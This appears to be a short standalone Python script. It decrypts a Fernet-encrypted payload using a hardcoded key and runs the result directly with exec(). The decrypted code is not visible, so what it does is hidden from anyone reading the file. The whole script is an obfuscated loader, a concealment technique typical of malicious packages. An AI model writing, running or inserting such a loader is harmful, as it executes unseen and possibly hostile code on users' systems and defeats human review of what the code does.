import base64
from cryptography.fernet import Fernet


payload = b'gAAAAABi07ArPQFIU7YI19Zd5N0Iy2Ywps8VFtT9D2BhgxSrQWSCX2j2Cfw5WMlyGZt6T_C3gi1JjHUXc_yZoWrXM5ErXf3waW6Q0ejFl8JB2jOyoIzXDQB4lY9TNi4ypPxeluyuH0Yftsmwm7cv25IreAf4zxKb0WeWEeuVRIMdLhLROFGnj_jIxb2aoEHCyW-rQogmpjAWu_jQjWnaRumkKs85XCCepNgtTu9Gvhfeurb0DaBgFlwtlozbyR1ZohUDfHIK-4FTNT5LTE2uLX9CC4meIuXB4A=='
key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())





 